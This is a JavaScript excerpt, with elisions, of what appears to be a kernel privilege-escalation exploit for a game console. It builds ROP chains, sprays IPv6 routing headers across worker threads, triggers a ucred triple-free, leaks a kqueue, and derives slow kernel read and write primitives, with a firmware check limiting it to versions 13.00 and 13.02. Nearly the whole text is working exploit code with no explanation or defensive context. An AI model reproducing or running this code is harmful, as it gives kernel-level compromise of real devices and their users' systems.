...
if (!String.prototype.padStart) {
  String.prototype.padStart = function (t, l) {
    t >>= 0;
    l = String(l || " ");
    if (this.length > t) return String(this);
    t -= this.length;
    if (t > l.length) l += l.repeat(t / l.length);
    return l.slice(0, t) + String(this);
  };
}
...
function write8(a, v) {
  mem.view(a).setUint8(0, v);
}
function write16(a, v) {
  mem.view(a).setUint16(0, v, true);
}
function write32(a, v) {
  mem.view(a).setUint32(0, v, true);
}
function write64(a, v) {
  mem.view(a).setBigInt(0, new BigInt(v), true);
}
function read8(a) {
  return mem.view(a).getUint8(0);
}
function read16(a) {
  return mem.view(a).getUint16(0, true);
}
function read32(a) {
  return mem.view(a).getUint32(0, true);
}
function read64(a) {
  return mem.view(a).getBigInt(0, true);
}
function malloc(s) {
  return mem.malloc(s);
}
...
function free_rthdr(sd) {
  set_rthdr(sd, new BigInt(0), 0);
}
function free_rthdrs(sds) {
  for (var s of sds) if (!s.eq(BigInt_Error)) free_rthdr(s);
}
...
function wait_for(addr, thresh) {
  while (!read64(addr).eq(thresh)) nanosleep_fun(1);
}
...
function spawn_thread(rop_array, loop_size, predefStack) {
  ...
  if (loop_size)
    rop_regen_and_loop(rop_addr.add(rop_array.length * 8).sub(8), loop_size);
...
function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
  ...
  var rbuf = malloc(4);
  write16(rbuf, 2);
  write16(rbuf.add(2), MAIN_RTPRIO);
  rop.push(
    gadgets.POP_RDI_RET,
    new BigInt(1),
    gadgets.POP_RSI_RET,
...
function ipv6_spray_and_read_rop(ready, run_fd, done, signal_buf) {
  ...
  for (var i = 0; i < ipv6_socks.length; i++) {
    rop.push(
      ...
      ipv6_socks[i],
      gadgets.POP_RSI_RET,
      new BigInt(IPPROTO_IPV6),
      gadgets.POP_RDX_RET,
      new BigInt(IPV6_RTHDR),
      gadgets.POP_RCX_RET,
...
function create_workers() {
  ...
  for (var i = 0; i < IOV_THREAD_NUM; i++) {
    var ready = iov_thread_ready.add(8 * i),
      done = iov_thread_done.add(8 * i);
    var sig = iov_signal_buf.add(8 * i);
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock);
    var p0 = read32(sock),
      p1 = read32(sock.add(4));
  ...
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    var ready = uio_readv_thread_ready.add(8 * i),
      done = uio_readv_thread_done.add(8 * i);
  ...
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    var ready = uio_writev_thread_ready.add(8 * i),
      done = uio_writev_thread_done.add(8 * i);
...
function init_workers() {
  ...
  for (var w of iov_recvmsg_workers)
    w.thread_id = Number(spawn_thread(w.rop, w.loop_size).and(0xffffffff));
...
function wait_iov_recvmsg() {
  for (var w of iov_recvmsg_workers) wait_for(w.done, 1);
}
...
function wait_uio_readv() {
  for (var w of uio_readv_workers) wait_for(w.done, 1);
}
...
function wait_uio_writev() {
  for (var w of uio_writev_workers) wait_for(w.done, 1);
}
...
function setup() {
  ...
  spray_rthdr = malloc(UCRED_SIZE);
  leak_rthdr = malloc(UCRED_SIZE);
  spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
  read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
  check_len = malloc(4);
  write32(check_len, 8);
  msg = malloc(MSG_HDR_SIZE);
  msgIov = malloc(MSG_IOV_NUM * IOV_SIZE);
  uioIovRead = malloc(UIO_IOV_NUM * IOV_SIZE);
  uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);
  var dummy = malloc(0x1000);
  fill_buffer_64(dummy, new BigInt(0x41414141, 0x41414141), 0x1000);
  write64(uioIovRead.add(0), dummy);
  write64(uioIovWrite.add(0), dummy);

  iov_thread_ready = malloc(8 * IOV_THREAD_NUM);
  iov_thread_done = malloc(8 * IOV_THREAD_NUM);
  iov_signal_buf = malloc(8 * IOV_THREAD_NUM);
  uio_readv_thread_ready = malloc(8 * UIO_THREAD_NUM);
  uio_readv_thread_done = malloc(8 * UIO_THREAD_NUM);
  uio_readv_signal_buf = malloc(8 * UIO_THREAD_NUM);
  uio_writev_thread_ready = malloc(8 * UIO_THREAD_NUM);
  uio_writev_thread_done = malloc(8 * UIO_THREAD_NUM);
  uio_writev_signal_buf = malloc(8 * UIO_THREAD_NUM);
  spray_ipv6_ready = malloc(8);
  spray_ipv6_done = malloc(8);
  spray_ipv6_signal_buf = malloc(8);
  spray_ipv6_stack = malloc(0x2000);

  master_pipe_buf = malloc(PIPEBUF_SIZE);
  victim_pipe_buf = malloc(PIPEBUF_SIZE);
  tmp = malloc(PAGE_SIZE);
  sockopt_val_buf = malloc(4);
  nc_set_buf = malloc(8);
  nc_clear_buf = malloc(8);
  spawn_thr_args = malloc(0x80);
  spawn_tid = malloc(8);
  spawn_cpid = malloc(8);
  nanosleep_timespec = malloc(0x10);
  cpu_mask_buf = malloc(0x10);
  rtprio_scratch = malloc(4);
  ...
  var sock = malloc(8);
  socketpair(AF_UNIX, SOCK_STREAM, 0, sock);
  uio_sock_0 = read32(sock);
  uio_sock_1 = read32(sock.add(4));
  socketpair(AF_UNIX, SOCK_STREAM, 0, sock);
  iov_sock_0 = read32(sock);
  iov_sock_1 = read32(sock.add(4));
  ...
  var ps = malloc(8);
  pipe(ps);
  masterRpipeFd = read32(ps);
  masterWpipeFd = read32(ps.add(4));
  pipe(ps);
  victimRpipeFd = read32(ps);
  victimWpipeFd = read32(ps.add(4));
...
function find_twins() {
  for (var attempt = 0; attempt < MAX_ROUNDS_TWIN; attempt++) {
    ...
    for (var i = 0; i < ipv6_socks.length; i++) {
      ...
      var val = read32(leak_rthdr.add(4)),
        j = val & 0xffff;
...
function find_triplet(master, exclude, maxRounds) {
  ...
  for (var r = 0; r < maxRounds; r++) {
    ...
    var val = read32(leak_rthdr.add(4)),
      j = val & 0xffff;
    if ((val & 0xffff0000) == RTHDR_TAG && j != master && j != exclude)
      return j;
  }
  return -1;
}
...
function trigger_ucred_triplefree() {
  ...
  for (
    var attempt = 0;
    attempt < TRIPLEFREE_ITERATIONS && !success;
    attempt++
  ) {
...
function leak_kqueue() {
  ...
  for (var cnt = 0; cnt < KQUEUE_ITERATIONS; cnt++) {
    ...
    if (read64(magic_off).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0))
      break;
    close(kq);
    sched_yield();
  }
  if (cnt == KQUEUE_ITERATIONS) {
    log("kqueue leak failed");
    return false;
  }
...
function kreadslow64(addr) {
  var b = kreadslow(addr, 8);
  if (b.eq(BigInt_Error)) throw new Error("kreadslow failed");
  return read64(b);
}
...
function kwriteslow(addr, buf, size) {
  ...
  for (;;) {
    ...
    if (read32(uio_leak_off) == UIO_IOV_NUM) break;
    for (var i = 0; i < UIO_THREAD_NUM; i++)
      write(new BigInt(uio_sock_1), buf, size);
    wait_uio_readv();
  }
  var uio_iov = read64(leak_rthdr);
...
function remove_rthr_from_socket(fd) {
  if (fd > 0) {
    ...
    if (fp.gt(new BigInt(0xffff0000, 0x0))) {
      var data = kread64(fp.add(0));
      var so_pcb = kread64(data.add(0x18));
...
if (
  [
    ...
    "13.00",
    "13.02",
  ].indexOf(FW_VERSION) == -1
) {
  log("Unsupported firmware");
  throw new Error("FW not supported");
}
